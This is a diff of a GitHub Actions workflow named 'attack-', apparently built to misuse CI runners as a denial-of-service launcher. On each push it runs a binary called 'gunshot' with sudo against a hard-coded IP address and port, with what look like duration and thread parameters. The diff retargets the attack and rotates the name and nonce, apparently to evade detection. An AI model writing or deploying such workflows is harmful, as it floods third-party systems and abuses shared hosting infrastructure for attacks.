@@ -1,4 +1,4 @@
-name: attack-cfd32d74
+name: attack-5808b1ed
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.17.24 32001 60 200
+      run: sudo ./gunshot 91.108.17.10 32000 60 200
       continue-on-error: true
-    - name: Nonce cfd32d74
-      run: echo "nonce=cfd32d74"
+    - name: Nonce 5808b1ed
+      run: echo "nonce=5808b1ed"
